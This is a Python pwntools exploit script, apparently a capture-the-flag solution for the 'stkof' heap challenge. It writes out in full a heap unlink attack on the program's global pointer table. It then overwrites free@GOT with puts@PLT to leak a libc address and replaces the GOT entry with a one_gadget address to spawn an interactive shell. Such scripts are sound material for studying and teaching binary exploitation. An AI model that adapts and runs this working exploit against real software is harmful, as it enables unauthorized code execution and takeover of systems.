#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./stkof"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def malloc(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil("OK\n")

def write(idx, content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(content)
    p.recvuntil("OK\n")

def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
    p.recvuntil("OK\n")

def puts(idx):
    p.sendline("4")
    p.send(idx)

pop3_ret = 0x400dbe
pop_rdi_ret = 0x400dc3
pop_rsi_pop_ret = 0x400dc1
pop_rsp_pop3_ret = 0x400dbd

puts_plt = 0x400760
free_got = 0x602018
atol_got = 0x602080

system_off = 0x45390
bin_sh_off = 0x18cd17
one_gadget1 = 0x45216
one_gadget2 = 0x4526a
one_gadget3 = 0xcd0f3
one_gadget4 = 0xcd1c8
one_gadget5 = 0xf0274
one_gadget6 = 0xf0280
one_gadget7 = 0xf1117
one_gadget8 = 0xf66c0


malloc(0x80)
malloc(0x80)    # chunk2
malloc(0x80)    # chunk3

payload = p64(0)
payload += p64(0x8)
payload += p64(0x602140+0x10-0x18)
payload += p64(0x602140+0x10-0x10)
payload += p64(0)*12
payload += p64(0x80)
payload += p64(0x90)
write(2, payload)

free(3)

payload = p64(0)*3
payload += p64(free_got)
payload += p64(atol_got)
#payload += p64(0x602160)
write(2, payload)

payload = p64(puts_plt)
write(2, payload)

#gdb.attach(p)
p.sendline("3")
p.sendline("3")

libc_base = u64(p.recvline().strip().ljust(8, "\x00"))-0x36ea0
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base + system_off
payload = p64(system_addr)

one_gadget = libc_base + one_gadget5
payload = p64(one_gadget)
write(2, payload)

bin_sh_addr = libc_base + bin_sh_off
payload = p64(bin_sh_addr)
#write(4, payload)

#gdb.attach(p)
p.sendline("3")
p.sendline("2")

p.interactive()
